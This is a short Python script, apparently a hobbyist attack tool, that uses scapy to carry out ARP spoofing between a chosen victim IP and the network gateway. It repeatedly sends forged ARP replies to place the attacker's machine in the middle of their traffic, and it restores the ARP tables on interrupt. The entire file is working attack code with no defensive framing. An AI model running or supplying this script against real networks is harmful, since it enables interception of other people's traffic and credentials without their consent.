import optparse
import time
import scapy.all as scapy

def get_argument():
    parser=optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Specify victim ip address")
    parser.add_option("-r", "--router", dest="router_ip", help="Specify gateway ip address")
    options, argument = parser.parse_args()

    if not options.target_ip:
        parser.error("[ - ] please specify victim ip")

    if not options.router_ip:
        parser.error("[ - ] please specify gateway ip")
    return options

options = get_argument()
spoof_ip = options.router_ip
target_ip = options.target_ip



def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = arp_broadcast / arp_req
    answer = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answer[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac= get_mac(target_ip)
    spoof_mac= get_mac(spoof_ip)
    arp_response=scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)
spoof(target_ip,spoof_ip)

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_response, verbose=False,count=4)


try:
    while True:
        time.sleep(2)
        spoof(target_ip,spoof_ip)
        spoof(spoof_ip,target_ip)
        print("[+] 2 packet sent")
except KeyboardInterrupt:
    restore(target_ip,spoof_ip)
    restore(spoof_ip,target_ip)
    print("Exitting...")